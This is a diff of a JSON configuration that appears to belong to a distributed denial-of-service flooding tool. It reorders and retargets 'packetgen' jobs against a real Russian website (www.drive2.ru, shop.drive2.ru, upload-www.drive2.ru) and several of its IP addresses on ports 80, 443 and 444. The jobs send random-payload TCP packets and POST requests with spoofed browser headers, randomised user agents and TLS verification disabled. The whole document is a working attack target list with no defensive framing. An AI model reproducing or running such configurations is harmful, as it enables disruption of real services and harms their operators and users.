@@ -9,13 +9,79 @@
         {
             "type": "packetgen",
             "count": 55,
-            "name": "tcp://146.255.192.77:443",
+            "name": "https://www.drive2.ru/",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "146.255.192.77:443"
+                        "address": "www.drive2.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://www.drive2.ru/",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://www.drive2.ru/",
+                                "Referer": "https://www.drive2.ru/",
+                                "X-Forwarded-Host": "www.drive2.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 55,
+            "name": "tcp://146.255.192.77:444",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "146.255.192.77:444"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 55,
+            "name": "tcp://146.255.192.75:443",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "146.255.192.75:443"
                     }
                 },
                 "packet": {
@@ -53,13 +119,13 @@
         {
             "type": "packetgen",
             "count": 55,
-            "name": "tcp://146.255.192.82:443",
+            "name": "tcp://146.255.192.77:443",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "146.255.192.82:443"
+                        "address": "146.255.192.77:443"
                     }
                 },
                 "packet": {
@@ -75,13 +141,35 @@
         {
             "type": "packetgen",
             "count": 55,
-            "name": "https://upload-www.drive2.ru",
+            "name": "tcp://146.255.192.82:444",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "upload-www.drive2.ru:443",
+                        "address": "146.255.192.82:444"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 55,
+            "name": "https://shop.drive2.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "shop.drive2.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -92,7 +180,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://upload-www.drive2.ru",
+                            "path": "https://shop.drive2.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -105,56 +193,12 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://upload-www.drive2.ru",
-                                "Referer": "https://upload-www.drive2.ru",
-                                "X-Forwarded-Host": "upload-www.drive2.ru",
+                                "Origin": "https://shop.drive2.ru",
+                                "Referer": "https://shop.drive2.ru",
+                                "X-Forwarded-Host": "shop.drive2.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 55,
-            "name": "tcp://146.255.192.75:443",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "146.255.192.75:443"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 55,
-            "name": "tcp://146.255.192.75:444",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "146.255.192.75:444"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
                         }
                     }
                 }
@@ -207,57 +251,13 @@
         {
             "type": "packetgen",
             "count": 55,
-            "name": "tcp://146.255.192.82:80",
+            "name": "https://upload-www.drive2.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "146.255.192.82:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 55,
-            "name": "tcp://146.255.192.75:80",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "146.255.192.75:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 55,
-            "name": "https://www.drive2.ru/",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "www.drive2.ru:443",
+                        "address": "upload-www.drive2.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -268,7 +268,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://www.drive2.ru/",
+                            "path": "https://upload-www.drive2.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -281,53 +281,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://www.drive2.ru/",
-                                "Referer": "https://www.drive2.ru/",
-                                "X-Forwarded-Host": "www.drive2.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 55,
-            "name": "https://shop.drive2.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "shop.drive2.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://shop.drive2.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://shop.drive2.ru",
-                                "Referer": "https://shop.drive2.ru",
-                                "X-Forwarded-Host": "shop.drive2.ru",
+                                "Origin": "https://upload-www.drive2.ru",
+                                "Referer": "https://upload-www.drive2.ru",
+                                "X-Forwarded-Host": "upload-www.drive2.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -383,13 +339,13 @@
         {
             "type": "packetgen",
             "count": 55,
-            "name": "tcp://146.255.192.82:444",
+            "name": "tcp://146.255.192.82:443",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "146.255.192.82:444"
+                        "address": "146.255.192.82:443"
                     }
                 },
                 "packet": {
@@ -405,13 +361,57 @@
         {
             "type": "packetgen",
             "count": 55,
-            "name": "tcp://146.255.192.77:444",
+            "name": "tcp://146.255.192.75:444",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "146.255.192.77:444"
+                        "address": "146.255.192.75:444"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 55,
+            "name": "tcp://146.255.192.82:80",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "146.255.192.82:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 55,
+            "name": "tcp://146.255.192.75:80",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "146.255.192.75:80"
                     }
                 },
                 "packet": {
